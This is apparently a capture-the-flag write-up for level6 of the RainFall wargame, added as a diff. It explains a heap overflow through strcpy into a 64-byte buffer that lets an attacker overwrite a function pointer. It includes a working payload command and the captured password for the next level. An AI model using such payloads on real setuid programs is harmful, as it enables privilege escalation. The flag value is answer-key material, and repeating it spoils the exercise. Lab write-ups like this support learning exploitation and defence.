@@ -1,0 +1,19 @@
+There is a setuid binary "level6" own by level7
+
+After disassembling the binary we can see
+a n() function which call system() with "/bin/cat /home/user/level7/.pass"
+located at [0x8048454]
+a dummy m() function that print "Nope" on stdout
+
+function main() call m() via a function ptr, allocated on the heap
+but before that it use strcpy of the first argument to a 64 bytes buffer allocated on the heap too
+
+Here again the vulnerability resides in the strcpy() call
+as destination buffer isn't protected from overflow
+This is called a Heap Overflow Attack
+
+We'll send data to overflow the buffer then send the n() function address [0x8048454]
+to overwrite the function ptr
+
+level6@RainFall:~$> ./level6 `python -c 'print "A" * 72 + "\x54\x84\x04\x08"'`
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
